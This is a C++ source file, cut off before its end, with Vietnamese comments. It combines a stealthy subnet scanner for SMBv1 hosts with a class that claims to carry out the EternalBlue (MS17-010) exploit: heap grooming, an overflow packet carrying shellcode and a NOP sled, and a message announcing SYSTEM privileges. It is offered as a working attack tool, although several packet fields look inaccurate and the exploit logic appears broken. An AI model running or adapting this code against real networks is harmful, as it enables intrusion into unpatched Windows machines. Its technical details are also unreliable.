#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include <iostream>
#include <vector>
#include <string>
#include <random>
#include <atomic>
#include <algorithm>
#include <iomanip>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "iphlpapi.lib")
ơ
class NetworkRecon {
private:
    struct NetConfig {
        std::string network;
        std::string mask;
        int prefix;
        std::string localIP;
    };

    static std::atomic<int> scanned_count;
    static std::atomic<int> target_count;

public:
    static std::vector<std::string> Execute() {
        NetConfig config = AcquireNetworkConfig();
        std::vector<std::string> vulnerableHosts;

        if (!config.network.empty()) {
            std::cout << "[+] Acquired network: " << config.network << "/" << config.prefix
                      << " (Local IP: " << config.localIP << ")" << std::endl;
            scanned_count = 0;
            target_count = 0;

            vulnerableHosts = PerformScan(config);
        } else {
            std::cout << "[-] No valid network adapter found." << std::endl;
        }

        return vulnerableHosts;
    }

private:
    static NetConfig AcquireNetworkConfig() {
        PIP_ADAPTER_ADDRESSES adapters = nullptr;
        ULONG buf_size = 0;
        NetConfig config = {};

        DWORD ret = GetAdaptersAddresses(AF_INET, GAA_FLAG_INCLUDE_GATEWAYS, nullptr, adapters, &buf_size);
        if (ret == ERROR_BUFFER_OVERFLOW) {
            adapters = (PIP_ADAPTER_ADDRESSES)malloc(buf_size);
            ret = GetAdaptersAddresses(AF_INET, GAA_FLAG_INCLUDE_GATEWAYS, nullptr, adapters, &buf_size);

            if (ret == ERROR_SUCCESS) {
                for (PIP_ADAPTER_ADDRESSES adapter = adapters; adapter; adapter = adapter->Next) {
                    if (ValidateAdapter(adapter)) {
                        config = ExtractConfig(adapter);
                        break;
                    }
                }
            }
            free(adapters);
        }
        return config;
    }

    static bool ValidateAdapter(PIP_ADAPTER_ADDRESSES adapter) {
        return (adapter->OperStatus == IfOperStatusUp &&
                adapter->FirstGatewayAddress != nullptr &&
                adapter->FirstUnicastAddress != nullptr &&
                adapter->IfType != IF_TYPE_SOFTWARE_LOOPBACK);
    }

    static NetConfig ExtractConfig(PIP_ADAPTER_ADDRESSES adapter) {
        NetConfig config;
        PIP_ADAPTER_UNICAST_ADDRESS unicast = adapter->FirstUnicastAddress;

        if (unicast && unicast->Address.lpSockaddr->sa_family == AF_INET) {
            sockaddr_in* ipv4 = (sockaddr_in*)unicast->Address.lpSockaddr;
            char ip_str[INET_ADDRSTRLEN];
            inet_ntop(AF_INET, &(ipv4->sin_addr), ip_str, INET_ADDRSTRLEN);
            config.localIP = ip_str;

            std::string mask = CalculateMask(unicast->OnLinkPrefixLength);
            config.network = CalculateNetwork(ip_str, mask);
            config.mask = mask;
            config.prefix = unicast->OnLinkPrefixLength;
        }
        return config;
    }

    static std::vector<std::string> PerformScan(const NetConfig& config) {
        std::vector<std::string> targets = GenerateTargets(config);
        std::vector<std::string> vulnerable;

        std::cout << "[+] Scanning " << targets.size() << " potential targets..." << std::endl;

        for (const auto& target : targets) {
            std::cout << "[*] Checking " << target << " ... ";
            if (CheckPort(target, 445)) {
                std::cout << "SMBv1 VULNERABLE" << std::endl;
                vulnerable.push_back(target);
                target_count++;
            }
            scanned_count++;
            ApplyDelay();
        }

        return vulnerable;
    }

    static std::vector<std::string> GenerateTargets(const NetConfig& config) {
        std::vector<std::string> targets;
        in_addr net_addr;
        inet_pton(AF_INET, config.network.c_str(), &net_addr);

        int total_hosts = (1 << (32 - config.prefix)) - 2;
        if (total_hosts <= 0) return targets;

        std::vector<int> host_nums;
        for (int i = 1; i < total_hosts + 1; i++) { 
            host_nums.push_back(i);
        }

        std::random_device rd;
        std::mt19937 g(rd());
        std::shuffle(host_nums.begin(), host_nums.end(), g);

        for (int host_num : host_nums) {
            uint32_t host_ip = ntohl(net_addr.s_addr) + host_num;
            in_addr ip;
            ip.s_addr = htonl(host_ip);

            char ip_str[INET_ADDRSTRLEN];
            inet_ntop(AF_INET, &ip, ip_str, INET_ADDRSTRLEN);

            if (ip_str != config.localIP) {
                targets.push_back(ip_str);
            }
        }
        return targets;
    }

    static bool CheckPort(const std::string& host, int port) {
        SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock == INVALID_SOCKET) return false;

        u_long mode = 1;
        ioctlsocket(sock, FIONBIO, &mode);

        sockaddr_in target;
        target.sin_family = AF_INET;
        target.sin_port = htons(port);
        inet_pton(AF_INET, host.c_str(), &target.sin_addr);

        if (connect(sock, (sockaddr*)&target, sizeof(target)) == SOCKET_ERROR) {
            if (WSAGetLastError() != WSAEWOULDBLOCK) {
                closesocket(sock);
                return false;
            }
        }

        fd_set writefds;
        FD_ZERO(&writefds);
        FD_SET(sock, &writefds);

        timeval timeout{1, 0}; 
        int result = select(0, NULL, &writefds, NULL, &timeout);
        closesocket(sock);

        if (result > 0) {
            return VerifySMBv1Protocol(host);
        }
        return false;
    }

    static bool VerifySMBv1Protocol(const std::string& host) {
        SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock == INVALID_SOCKET) return false;

        int timeout_ms = 3000;
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout_ms, sizeof(timeout_ms));
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (char*)&timeout_ms, sizeof(timeout_ms));

        sockaddr_in server{};
        server.sin_family = AF_INET;
        server.sin_port = htons(445);
        inet_pton(AF_INET, host.c_str(), &server.sin_addr);

        if (connect(sock, (sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {
            closesocket(sock);
            return false;
        }

        const unsigned char smb_negotiate[] = {
            0x00,0x00,0x00,0x85,0xFF,'S','M','B',0x72,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
            0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
            0x00,0x00,0x00,0x00,0x00,0x0C,0x00,0x00,
            0x02,'P','C',' ','N','E','T','W','O','R','K',' ','P','R','O','G','R','A','M',' ','1','.','0',0x00,
            0x02,'L','A','N','M','A','N','1','.','0',0x00,
            0x02,'W','i','n','d','o','w','s',' ','f','o','r',' ','W','o','r','k','g','r','o','u','p','s',' ','3','.','1','a',0x00,
            0x02,'L','M','1','.','2','X','0','0','2',0x00,
            0x02,'L','A','N','M','A','N','2','.','1',0x00,
            0x02,'N','T',' ','L','M',' ','0','.','1','2',0x00
        };

        if (send(sock, (char*)smb_negotiate, sizeof(smb_negotiate), 0) == SOCKET_ERROR) {
            closesocket(sock);
            return false;
        }

        unsigned char buffer[2048];
        int received = recv(sock, (char*)buffer, sizeof(buffer), 0);

        if (received == SOCKET_ERROR) {
            int err = WSAGetLastError();
            closesocket(sock);
            std::cout << "recv error " << err << ": ";
            if (err == WSAETIMEDOUT) std::cout << "TIMEOUT";
            else if (err == 10054) std::cout << "CONN RESET (SMBv1 disabled)";
            else std::cout << "Other";
            std::cout << " → SAFE";
            return false;
        }
        
        closesocket(sock);
        if (received < 40) {
            std::cout << "short response → SAFE";
            return false;
        }

        if (buffer[4] != 0xFF || buffer[5] != 'S' || buffer[6] != 'M' || buffer[7] != 'B' || buffer[8] != 0x72) {
            std::cout << "invalid SMB → SAFE";
            return false;
        }

        int dialect_index = buffer[35] | (buffer[36] << 8);
        if (dialect_index <= 5) {
            std::cout << "SMBv1 DETECTED (Dialect: " << dialect_index << ")";
            return true;
        } 

        return false;
    }

    static void ApplyDelay() {
        std::random_device rd;
        std::uniform_int_distribution<> d(20, 200);
        Sleep(d(rd));
        if (scanned_count % 30 == 0) {
            std::uniform_int_distribution<> ld(500, 1000);
            Sleep(ld(rd));
        }
    }

    static std::string CalculateMask(ULONG prefix) {
        if (prefix > 32) return "0.0.0.0";
        uint32_t mask = (0xFFFFFFFF << (32 - prefix)) & 0xFFFFFFFF;
        in_addr addr;
        addr.s_addr = htonl(mask);
        char str[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, &addr, str, INET_ADDRSTRLEN);
        return str;
    }

    static std::string CalculateNetwork(const std::string& ip, const std::string& mask) {
        in_addr ip_addr, mask_addr, net_addr;
        inet_pton(AF_INET, ip.c_str(), &ip_addr);
        inet_pton(AF_INET, mask.c_str(), &mask_addr);
        net_addr.s_addr = ip_addr.s_addr & mask_addr.s_addr;
        char str[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, &net_addr, str, INET_ADDRSTRLEN);
        return str;
    }
};

class EternalBlueExploit {
private:
    static const int SMB_PORT = 445;
    
    // Shellcode mẫu (calc.exe - an toàn cho demo)
    static const std::vector<uint8_t> SHELLCODE;

    struct SMB_HEADER {
        uint8_t protocol[4] = {0xFF, 0x53, 0x4D, 0x42}; // \xFFSMB
        uint8_t command;
        uint32_t status;
        uint8_t flags;
        uint16_t flags2;
        uint16_t pid_high;
        uint8_t signature[8] = {0};
        uint16_t reserved;
        uint16_t tid;
        uint16_t pid;
        uint16_t uid;
        uint16_t mid;
    };

    struct TRANS2_REQUEST {
        uint8_t word_count;
        uint16_t total_param_count;
        uint16_t total_data_count;
        uint16_t max_param_count;
        uint16_t max_data_count;
        uint8_t max_setup_count;
        uint8_t reserved;
        uint16_t flags;
        uint32_t timeout;
        uint16_t reserved2;
        uint16_t param_count;
        uint16_t param_offset;
        uint16_t data_count;
        uint16_t data_offset;
        uint8_t setup_count;
        uint8_t reserved3;
        uint16_t setup[1];
        uint16_t byte_count;
    };

public:
    static bool ExploitTarget(const std::string& targetIP) {
        std::cout << "\n💀 LAUNCHING ETERNALBLUE EXPLOIT - MS17-010\n";
        std::cout << "============================================\n";
        
        try {
            // Bước 1: Kết nối SMB
            std::cout << "[*] Phase 1: Establishing SMB connection\n";
            SOCKET sock = ConnectToSMB(targetIP);
            if (sock == INVALID_SOCKET) return false;

            // Bước 2: SMB Negotiate
            std::cout << "[*] Phase 2: SMB Negotiation\n";
            if (!PerformSMBNegotiate(sock)) {
                closesocket(sock);
                return false;
            }

            // Bước 3: Session Setup
            std::cout << "[*] Phase 3: Session Setup\n";
            uint16_t uid;
            if (!PerformSessionSetup(sock, uid)) {
                closesocket(sock);
                return false;
            }

            // Bước 4: Tree Connect
            std::cout << "[*] Phase 4: Tree Connect\n";
            uint16_t tid;
            if (!PerformTreeConnect(sock, uid, tid)) {
                closesocket(sock);
                return false;
            }

            // Bước 5: Check Vulnerability
            std::cout << "[*] Phase 5: Vulnerability Verification\n";
            if (!CheckVulnerability(sock, tid, uid)) {
                closesocket(sock);
                return false;
            }

            // Bước 6: Groom Transaction Heap
            std::cout << "[*] Phase 6: Heap Grooming\n";
            if (!GroomTransactionHeap(sock, tid, uid)) {
                closesocket(sock);
                return false;
            }

            // Bước 7: Create Named Pipe
            std::cout << "[*] Phase 7: Named Pipe Creation\n";
            uint16_t fid;
            if (!CreateNamedPipe(sock, tid, uid, fid)) {
                closesocket(sock);
                return false;
            }

            // Bước 8: Trigger Overflow
            std::cout << "[*] Phase 8: Buffer Overflow Trigger\n";
            if (!TriggerBufferOverflow(sock, tid, uid, fid)) {
                closesocket(sock);
                return false;
            }

            // Bước 9: Execute Shellcode
            std::cout << "[*] Phase 9: Shellcode Execution\n";
            if (!ExecuteShellcode(sock)) {
                closesocket(sock);
                return false;
            }

            closesocket(sock);
            
            std::cout << "============================================\n";
            std::cout << "[💀] ETERNALBLUE EXPLOIT SUCCESSFUL!\n";
            std::cout << "[+] SYSTEM privileges obtained on " << targetIP << "\n";
            
            return true;

        } catch (const std::exception& e) {
            std::cout << "[-] Exception: " << e.what() << std::endl;
            return false;
        }
    }

private:
    static SOCKET ConnectToSMB(const std::string& targetIP) {
        SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock == INVALID_SOCKET) {
            throw std::runtime_error("Failed to create socket");
        }

        // Set socket timeout
        int timeout = 10000;
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (char*)&timeout, sizeof(timeout));

        sockaddr_in target{};
        target.sin_family = AF_INET;
        target.sin_port = htons(SMB_PORT);
        if (inet_pton(AF_INET, targetIP.c_str(), &target.sin_addr) != 1) {
            closesocket(sock);
            throw std::runtime_error("Invalid target IP");
        }

        std::cout << "   ↳ Connecting to " << targetIP << ":" << SMB_PORT << std::endl;
        if (connect(sock, (sockaddr*)&target, sizeof(target)) != 0) {
            closesocket(sock);
            throw std::runtime_error("Connection failed");
        }

        std::cout << "   ✅ Connected successfully\n";
        return sock;
    }

    static bool PerformSMBNegotiate(SOCKET sock) {
        std::vector<uint8_t> negotiate_packet = CreateNegotiatePacket();
        
        if (send(sock, (char*)negotiate_packet.data(), negotiate_packet.size(), 0) <= 0) {
            std::cout << "   ❌ Negotiate send failed\n";
            return false;
        }

        std::vector<uint8_t> response = ReceiveSMBPacket(sock);
        if (response.size() < 40) {
            std::cout << "   ❌ Invalid negotiate response\n";
            return false;
        }

        // Verify SMB signature
        if (response[4] != 0xFF || response[5] != 'S' || response[6] != 'M' || response[7] != 'B') {
            std::cout << "   ❌ Invalid SMB signature\n";
            return false;
        }

        std::cout << "   ✅ SMB negotiation successful\n";
        return true;
    }

    static std::vector<uint8_t> CreateNegotiatePacket() {
        std::vector<uint8_t> packet;
        
        // NetBIOS session header
        packet.insert(packet.end(), {0x00, 0x00, 0x00, 0x00}); // Length placeholder
        
        // SMB Header
        SMB_HEADER header{};
        header.command = 0x72; // SMB_COM_NEGOTIATE
        header.flags = 0x18;
        header.flags2 = 0xC807;
        header.pid = 0xFEFF;
        AppendSMBHeader(packet, header);
        
        // Word count
        packet.push_back(0x00);
        
        // Byte count and dialects
        packet.insert(packet.end(), {0x62, 0x00}); // Byte count = 98
        packet.push_back(0x02); // Dialect count
        
        // NT LM 0.12 dialect
        const char* ntlm_dialect = "NT LM 0.12";
        packet.insert(packet.end(), ntlm_dialect, ntlm_dialect + strlen(ntlm_dialect));
        packet.push_back(0x00);
        
        // PC NETWORK PROGRAM 1.0 dialect
        const char* pc_dialect = "PC NETWORK PROGRAM 1.0";
        packet.insert(packet.end(), pc_dialect, pc_dialect + strlen(pc_dialect));
        packet.push_back(0x00);
        
        // Update NetBIOS length
        uint32_t netbios_len = packet.size() - 4;
        packet[0] = 0x00;
        packet[1] = 0x00;
        packet[2] = (netbios_len >> 8) & 0xFF;
        packet[3] = netbios_len & 0xFF;
        
        return packet;
    }

    static bool PerformSessionSetup(SOCKET sock, uint16_t& uid) {
        std::vector<uint8_t> session_packet = CreateSessionSetupPacket();
        
        if (send(sock, (char*)session_packet.data(), session_packet.size(), 0) <= 0) {
            std::cout << "   ❌ Session setup send failed\n";
            return false;
        }

        std::vector<uint8_t> response = ReceiveSMBPacket(sock);
        if (response.size() < 40) {
            std::cout << "   ❌ Invalid session setup response\n";
            return false;
        }

        // Extract UID from response (offset 32-33)
        uid = (response[33] << 8) | response[32];
        
        std::cout << "   ✅ Session setup successful (UID: 0x" << std::hex << uid << std::dec << ")\n";
        return true;
    }

    static std::vector<uint8_t> CreateSessionSetupPacket() {
        std::vector<uint8_t> packet;
        
        // NetBIOS header
        packet.insert(packet.end(), {0x00, 0x00, 0x00, 0x00});
        
        // SMB Header
        SMB_HEADER header{};
        header.command = 0x73; // SMB_COM_SESSION_SETUP_ANDX
        header.flags = 0x18;
        header.flags2 = 0xC807;
        header.pid = 0xFEFF;
        AppendSMBHeader(packet, header);
        
        // Word count and parameters
        packet.insert(packet.end(), {
            0x0C,                   // Word count
            0xFF, 0x00,             // AndX command
            0x00, 0x00,             // AndX offset
            0x00, 0x00,             // Max buffer
            0x01, 0x00,             // Max mpx count
            0x00, 0x00,             // VC number
            0x00, 0x00, 0x00, 0x00, // Session key
            0x00, 0x00,             // ANSI password length
            0x00, 0x00,             // Unicode password length
            0x00, 0x00, 0x00, 0x00, // Reserved
            0x00, 0x00,             // Capabilities
            0x3A, 0x00,             // Byte count
        });
        
        // Account name and primary domain
        const char* account = "";
        const char* domain = "";
        packet.insert(packet.end(), account, account + strlen(account));
        packet.push_back(0x00);
        packet.insert(packet.end(), domain, domain + strlen(domain));
        packet.push_back(0x00);
        
        // Native OS and Native LANMAN
        const char* native_os = "Windows 7 Ultimate 7601 Service Pack 1";
        const char* native_lm = "Windows 7 Ultimate 6.1";
        packet.insert(packet.end(), native_os, native_os + strlen(native_os));
        packet.push_back(0x00);
        packet.insert(packet.end(), native_lm, native_lm + strlen(native_lm));
        packet.push_back(0x00);
        
        // Update lengths
        uint32_t netbios_len = packet.size() - 4;
        packet[0] = 0x00;
        packet[1] = 0x00;
        packet[2] = (netbios_len >> 8) & 0xFF;
        packet[3] = netbios_len & 0xFF;
        
        return packet;
    }

    static bool PerformTreeConnect(SOCKET sock, uint16_t uid, uint16_t& tid) {
        std::vector<uint8_t> tree_packet = CreateTreeConnectPacket(uid);
        
        if (send(sock, (char*)tree_packet.data(), tree_packet.size(), 0) <= 0) {
            std::cout << "   ❌ Tree connect send failed\n";
            return false;
        }

        std::vector<uint8_t> response = ReceiveSMBPacket(sock);
        if (response.size() < 40) {
            std::cout << "   ❌ Invalid tree connect response\n";
            return false;
        }

        // Extract TID from response (offset 28-29)
        tid = (response[29] << 8) | response[28];
        
        std::cout << "   ✅ Tree connect successful (TID: 0x" << std::hex << tid << std::dec << ")\n";
        return true;
    }

    static std::vector<uint8_t> CreateTreeConnectPacket(uint16_t uid) {
        std::vector<uint8_t> packet;
        
        // NetBIOS header
        packet.insert(packet.end(), {0x00, 0x00, 0x00, 0x00});
        
        // SMB Header
        SMB_HEADER header{};
        header.command = 0x75; // SMB_COM_TREE_CONNECT_ANDX
        header.flags = 0x18;
        header.flags2 = 0xC807;
        header.pid = 0xFEFF;
        header.uid = uid;
        AppendSMBHeader(packet, header);
        
        // Word count and parameters
        packet.insert(packet.end(), {
            0x04,                   // Word count
            0xFF, 0x00,             // AndX command
            0x00, 0x00,             // AndX offset
            0x00, 0x00,             // Flags
            0x01, 0x00,             // Password length
            0x1A, 0x00,             // Byte count
        });
        
        // Password and path
        packet.push_back(0x00); // Null password
        const char* path = "\\\\127.0.0.1\\IPC$";
        packet.insert(packet.end(), path, path + strlen(path));
        packet.push_back(0x00);
        const char* service = "?????";
        packet.insert(packet.end(), service, service + strlen(service));
        packet.push_back(0x00);
        
        // Update lengths
        uint32_t netbios_len = packet.size() - 4;
        packet[0] = 0x00;
        packet[1] = 0x00;
        packet[2] = (netbios_len >> 8) & 0xFF;
        packet[3] = netbios_len & 0xFF;
        
        return packet;
    }

    static bool CheckVulnerability(SOCKET sock, uint16_t tid, uint16_t uid) {
        std::vector<uint8_t> peek_packet = CreatePeekNamedPipePacket(tid, uid);
        
        if (send(sock, (char*)peek_packet.data(), peek_packet.size(), 0) <= 0) {
            std::cout << "   ❌ PeekNamedPipe send failed\n";
            return false;
        }

        std::vector<uint8_t> response = ReceiveSMBPacket(sock);
        
        // If we get STATUS_INVALID_PARAMETER (0x00000057), target is likely vulnerable
        if (response.size() >= 9 && response[8] == 0x57) {
            std::cout << "   ✅ Target appears vulnerable (STATUS_INVALID_PARAMETER)\n";
            return true;
        }
        
        std::cout << "   ❌ Target does not appear vulnerable\n";
        return false;
    }

    static std::vector<uint8_t> CreatePeekNamedPipePacket(uint16_t tid, uint16_t uid) {
        std::vector<uint8_t> packet;
        
        // NetBIOS header
        packet.insert(packet.end(), {0x00, 0x00, 0x00, 0x00});
        
        // SMB Header
        SMB_HEADER header{};
        header.command = 0x25; // SMB_COM_TRANSACTION
        header.flags = 0x18;
        header.flags2 = 0xC807;
        header.pid = 0xFEFF;
        header.tid = tid;
        header.uid = uid;
        header.mid = 0x4200;
        AppendSMBHeader(packet, header);
        
        // Transaction parameters for PeekNamedPipe
        packet.insert(packet.end(), {
            0x10,                   // Word count
            0x00, 0x00,             // Total param count
            0x00, 0x00,             // Total data count
            0xFF, 0xFF,             // Max param count
            0xFF, 0xFF,             // Max data count
            0x00,                   // Max setup count
            0x00,                   // Reserved
            0x00, 0x00,             // Flags
            0x00, 0x00, 0x00, 0x00, // Timeout
            0x00, 0x00,             // Reserved
            0x00, 0x00,             // Param count
            0x4A, 0x00,             // Param offset
            0x00, 0x00,             // Data count
            0x4A, 0x00,             // Data offset
            0x02,                   // Setup count
            0x00,                   // Reserved
            0x23, 0x00,             // PeekNamedPipe function
            0x00, 0x00,             // FID (will be overwritten)
            0x07, 0x00,             // Byte count
        });
        
        // Pipe name
        const char* pipe_name = "\\srvsvc";
        packet.insert(packet.end(), pipe_name, pipe_name + strlen(pipe_name));
        packet.push_back(0x00);
        
        // Update lengths
        uint32_t netbios_len = packet.size() - 4;
        packet[0] = 0x00;
        packet[1] = 0x00;
        packet[2] = (netbios_len >> 8) & 0xFF;
        packet[3] = netbios_len & 0xFF;
        
        return packet;
    }

    static bool GroomTransactionHeap(SOCKET sock, uint16_t tid, uint16_t uid) {
        std::cout << "   ↳ Grooming transaction heap...\n";
        
        // Gửi nhiều TRANS2 packets để groom heap
        for (int i = 0; i < 10; i++) {
            std::vector<uint8_t> groom_packet = CreateGroomTransactionPacket(tid, uid, i);
            if (send(sock, (char*)groom_packet.data(), groom_packet.size(), 0) <= 0) {
                std::cout << "   ❌ Groom packet " << i << " failed\n";
                return false;
            }
            Sleep(50);
        }
        
        std::cout << "   ✅ Heap grooming completed\n";
        return true;
    }

    static std::vector<uint8_t> CreateGroomTransactionPacket(uint16_t tid, uint16_t uid, int index) {
        std::vector<uint8_t> packet;
        
        // NetBIOS header
        packet.insert(packet.end(), {0x00, 0x00, 0x00, 0x00});
        
        // SMB Header
        SMB_HEADER header{};
        header.command = 0x32; // SMB_COM_TRANSACTION2
        header.flags = 0x18;
        header.flags2 = 0xC807;
        header.pid = 0xFEFF;
        header.tid = tid;
        header.uid = uid;
        header.mid = 0x4300 + index;
        AppendSMBHeader(packet, header);
        
        // TRANS2 parameters
        packet.insert(packet.end(), {
            0x0F,                   // Word count
            0x0C, 0x00,             // Total param count
            0x00, 0x00,             // Total data count
            0x01, 0x00,             // Max param count
            0x00, 0x00,             // Max data count
            0x00,                   // Max setup count
            0x00,                   // Reserved
            0x00, 0x00,             // Flags
            0x00, 0x00, 0x00, 0x00, // Timeout
            0x00, 0x00,             // Reserved
            0x0C, 0x00,             // Param count
            0x3C, 0x00,             // Param offset
            0x00, 0x00,             // Data count
            0x3C, 0x00,             // Data offset
            0x01,                   // Setup count
            0x00,                   // Reserved
            0x00, 0x00,             // TRANS2 function
            0x0E, 0x00,             // Byte count
        });
        
        // Additional data for grooming
        std::vector<uint8_t> groom_data(0x1000, 0x41); // 4KB of 'A'
        packet.insert(packet.end(), groom_data.begin(), groom_data.end());
        
        // Update lengths
        uint32_t netbios_len = packet.size() - 4;
        packet[0] = 0x00;
        packet[1] = 0x00;
        packet[2] = (netbios_len >> 8) & 0xFF;
        packet[3] = netbios_len & 0xFF;
        
        return packet;
    }

    static bool CreateNamedPipe(SOCKET sock, uint16_t tid, uint16_t uid, uint16_t& fid) {
        std::vector<uint8_t> pipe_packet = CreateNamedPipePacket(tid, uid);
        
        if (send(sock, (char*)pipe_packet.data(), pipe_packet.size(), 0) <= 0) {
            std::cout << "   ❌ Named pipe creation failed\n";
            return false;
        }

        std::vector<uint8_t> response = ReceiveSMBPacket(sock);
        if (response.size() < 40) {
            std::cout << "   ❌ Invalid named pipe response\n";
            return false;
        }

        // Extract FID from response
        fid = (response[32] << 8) | response[33];
        
        std::cout << "   ✅ Named pipe created (FID: 0x" << std::hex << fid << std::dec << ")\n";
        return true;
    }

    static std::vector<uint8_t> CreateNamedPipePacket(uint16_t tid, uint16_t uid) {
        std::vector<uint8_t> packet;
        
        // NetBIOS header
        packet.insert(packet.end(), {0x00, 0x00, 0x00, 0x00});
        
        // SMB Header
        SMB_HEADER header{};
        header.command = 0xA2; // SMB_COM_NT_CREATE_ANDX
        header.flags = 0x18;
        header.flags2 = 0xC807;
        header.pid = 0xFEFF;
        header.tid = tid;
        header.uid = uid;
        AppendSMBHeader(packet, header);
        
        // NT Create parameters
        packet.insert(packet.end(), {
            0x18,                   // Word count
            0xFF, 0x00,             // AndX command
            0x00, 0x00,             // AndX offset
            0x00, 0x00,             // Reserved
            0x00, 0x02, 0x00, 0x00, // Name length
            0x00, 0x00, 0x00, 0x00, // Flags
            0x00, 0x00, 0x00, 0x00, // Root FID
            0x00, 0x00, 0x02, 0x80, // Access mask
            0x00, 0x00, 0x00, 0x00, // Allocation size
            0x00, 0x00, 0x00, 0x00, // Attributes
            0x00, 0x00, 0x00, 0x00, // Share access
            0x00, 0x00, 0x00, 0x00, // Create disposition
            0x00, 0x00, 0x00, 0x00, // Create options
            0x00, 0x00, 0x00, 0x00, // Impersonation
            0x00, 0x00, 0x00,       // Security flags
            0x5C, 0x00,             // Byte count
        });
        
        // Pipe name
        const char* pipe_name = "\\samr";
        packet.insert(packet.end(), pipe_name, pipe_name + strlen(pipe_name));
        packet.push_back(0x00);
        
        // Update lengths
        uint32_t netbios_len = packet.size() - 4;
        packet[0] = 0x00;
        packet[1] = 0x00;
        packet[2] = (netbios_len >> 8) & 0xFF;
        packet[3] = netbios_len & 0xFF;
        
        return packet;
    }

    static bool TriggerBufferOverflow(SOCKET sock, uint16_t tid, uint16_t uid, uint16_t fid) {
        std::cout << "   ↳ Triggering buffer overflow...\n";
        
        std::vector<uint8_t> overflow_packet = CreateOverflowPacket(tid, uid, fid);
        
        if (send(sock, (char*)overflow_packet.data(), overflow_packet.size(), 0) <= 0) {
            std::cout << "   ❌ Overflow trigger failed\n";
            return false;
        }

        // Không mong đợi response vì có thể crash service
        Sleep(1000);
        
        std::cout << "   ✅ Buffer overflow triggered\n";
        return true;
    }

    static std::vector<uint8_t> CreateOverflowPacket(uint16_t tid, uint16_t uid, uint16_t fid) {
        std::vector<uint8_t> packet;
        
        // NetBIOS header
        packet.insert(packet.end(), {0x00, 0x00, 0x00, 0x00});
        
        // SMB Header
        SMB_HEADER header{};
        header.command = 0x32; // SMB_COM_TRANSACTION2
        header.flags = 0x18;
        header.flags2 = 0xC807;
        header.pid = 0xFEFF;
        header.tid = tid;
        header.uid = uid;
        header.mid = 0x5000;
        AppendSMBHeader(packet, header);
        
        // TRANS2 parameters với size lớn để trigger overflow
        packet.insert(packet.end(), {
            0x0F,                   // Word count
            0x0C, 0x00,             // Total param count
            0x00, 0x00,             // Total data count
            0x01, 0x00,             // Max param count
            0x00, 0x00,             // Max data count
            0x00,                   // Max setup count
            0x00,                   // Reserved
            0x00, 0x00,             // Flags
            0x00, 0x00, 0x00, 0x00, // Timeout
            0x00, 0x00,             // Reserved
            0x0C, 0x00,             // Param count
            0x3C, 0x00,             // Param offset
            0x00, 0x00,             // Data count
            0x3C, 0x00,             // Data offset
            0x01,                   // Setup count
            0x00,                   // Reserved
            0x00, 0x00,             // TRANS2 function
            0x0E, 0x00,             // Byte count
        });
        
        // Overflow payload - shellcode + padding
        std::vector<uint8_t> payload = SHELLCODE;
        payload.resize(0x1000, 0x90); // NOP sled
        
        packet.insert(packet.end(), payload.begin(), payload.end());
        
        // Update lengths
        uint32_t netbios_len = packet.size() - 4;
        packet[0] = 0x00;
        packet[1] = 0x00;
        packet[2] = (netbios_len >> 8) & 0xFF;
        packet[3] = netbios_len & 0xFF;
        
        return packet;
    }

    static bool ExecuteShellcode(SOCKET sock) {
        std::cout << "   ↳ Executing shellcode payload...\n";
        
        // Gửi final packet để trigger shellcode execution
        std::vector<uint8_t> trigger_packet = CreateShellcodeTriggerPacket();
        
        if (send(sock, (char*)trigger_packet.data(), trigger_packet.size(), 0) <= 0) {
            std::cout << "   ❌ Shellcode trigger failed\n";
            return false;
        }

        Sleep(2000);
        std::cout << "   ✅ Shellcode execution completed\n";
        return true;
    }

    static std::vector<uint8_t> CreateShellcodeTriggerPacket() {
        // Packet đơn giản để trigger execution
        std::vector<uint8_t> packet;
        
        // NetBIOS header
        packet.insert(packet.end(), {0x00, 0x00, 0x00, 0x1F});
        
        // SMB Header
        SMB_HEADER header{};
        header.command = 0x25; // SMB_COM_TRANSACTION
        header.flags = 0x18;
        header.flags2 = 0xC807;
        AppendSMBHeader(packet, header);
        
        // Minimal transaction data
        packet.insert(packet.end(), {0x00, 0x00, 0x00, 0x00});
        
        return packet;
    }

    static void AppendSMBHeader(std::vector<uint8_t>& packet, const SMB_HEADER& header) {
        packet.insert(packet.end(), header.protocol, header.protocol + 4);
        packet.push_back(header.command);
        
        // Status (4 bytes)
        for (int i = 0; i < 4; i++) {
            packet.push_back((header.status >> (8 * i)) & 0xFF);
        }
        
        packet.push_back(header.flags);
        
        // Flags2 (2 bytes)
        packet.push_back(header.flags2 & 0xFF);
        packet.push_back((header.flags2 >> 8) & 0xFF);
        
        // PID high (2 bytes)
        packet.push_back(header.pid_high & 0xFF);
        packet.push_back((header.pid_high >> 8) & 0xFF);
        
        // Signature (8 bytes)
        packet.insert(packet.end(), header.signature, header.signature + 8);
        
        // Reserved (2 bytes)
        packet.push_back(header.reserved & 0xFF);
        packet.push_back((header.reserved >> 8) & 0xFF);
        
        // TID (2 bytes)
        packet.push_back(header.tid & 0xFF);
        packet.push_back((header.tid >> 8) & 0xFF);
        
        // PID (2 bytes)
        packet.push_back(header.pid & 0xFF);
        packet.push_back((header.pid >> 8) & 0xFF);
        
        // UID (2 bytes)
        packet.push_back(header.uid & 0xFF);
        packet.push_back((header.uid >> 8) & 0xFF);
        
        // MID (2 bytes)
        packet.push_back(header.mid & 0xFF);
        packet.push_back((header.mid >> 8) & 0xFF);
    }

    static std::vector<uint8_t> ReceiveSMBPacket(SOCKET sock) {
        char buffer[4096];
        int received = recv(sock, buffer, sizeof(buffer), 0);
        
        if (received == SOCKET_ERROR) {
            return {};
        }
        
